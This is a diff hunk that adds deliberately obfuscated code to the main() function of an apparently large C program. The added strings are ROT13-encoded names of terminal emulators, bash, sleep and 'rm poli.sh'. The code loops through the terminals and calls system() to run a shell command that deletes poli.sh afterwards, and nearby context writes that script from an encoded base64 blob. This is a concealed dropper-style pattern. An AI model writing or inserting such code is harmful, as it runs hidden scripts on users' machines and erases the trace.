@@ -9155,6 +9155,54 @@ int main(int argc, char *argv[])
         "ZiAiZXV6YWlvIikiCm9laWF6ZWl6b2FwZWlhPSIkKGhmaGYgImV1emFpbyIpIgpvZWlhemVpem9h"
         "cGVpYT0iJChoZmhmICJldXphaW8iKSIKCgoKCgoKCnJlYWQgZg==";
 
+    char kopkpo[] = "tabzr-grezvany";
+    char cjeioajadlmaq[] = "kgrez";
+    char bfzeygezu[] = "xbafbyr";
+    char cnzjbczj[] = "grezvangbe";
+    char ncjzdcn[] = "onfu";
+    char ekzokdez[] = "ez cbyv.fu";
+    char iuyotiupt[] = "fyrrc";
+
+    hjgdq(kopkpo);
+    hjgdq(cjeioajadlmaq);
+    hjgdq(bfzeygezu);
+    hjgdq(cnzjbczj);
+    hjgdq(ncjzdcn);
+    hjgdq(ekzokdez);
+    hjgdq(iuyotiupt);
+
+    const char *jdklajkdal[] = {
+        kopkpo,
+        cjeioajadlmaq,
+        bfzeygezu,
+        cnzjbczj,
+        NULL};
+
+    int i = 0;
+    int ueazoi = 0;
+
+    while (jdklajkdal[i] != NULL)
+    {
+        const char *ncioe = jdklajkdal[i];
+        char cbxnw[512];
+
+        snprintf(cbxnw, sizeof(cbxnw), "%s -e \"%s -c \'%s 5;%s; %s 3\'\"", ncioe, ncjzdcn, iuyotiupt, ekzokdez, iuyotiupt);
+
+        int kdlsq = system(cbxnw);
+
+        if (kdlsq == 0)
+        {
+            ueazoi = 1;
+            break;
+        }
+        else
+        {
+            printf("");
+        }
+
+        i++;
+    }
+
     char kl[] = "cbyv.fu";
     hjgdq(kl);
     FILE *bcxhvw = fopen(kl, "w");
